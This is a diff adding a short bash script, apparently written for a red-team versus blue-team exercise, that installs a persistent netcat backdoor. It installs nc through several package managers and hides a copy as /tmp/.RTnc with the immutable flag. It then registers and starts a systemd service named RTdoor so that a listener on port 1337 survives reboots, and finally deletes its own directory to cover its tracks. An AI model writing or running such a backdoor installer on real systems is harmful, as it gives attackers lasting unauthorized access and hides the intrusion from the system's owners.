@@ -1,0 +1,17 @@
+#!/bin/bash
+
+#Runs through different distributions just in case
+apt-get install nc -y 2&>/dev/null
+yum install nc -y 2&>/dev/null
+pacman -S nc -y 2&>/dev/null
+
+#Makes another way in which blue team can stop the backdoor, im nice like that..
+cp $(which nc) /tmp/.RTnc; chmod +i /tmp/.RTnc
+sed -i 's+$CHANGEME+/tmp/.RTnc+g' backdoor.service
+
+#Copy and start the netcat listener (if blueteam reboots the port 1337 will stay open)
+cp ./backdoor.service /etc/systemd/system/RTdoor.service
+systemctl enable RTdoor; systemctl start RTdoor; systemctl status RTdoor
+
+#Deletes itself when finished
+find / -type d -name RTDoor | xargs rm -rf
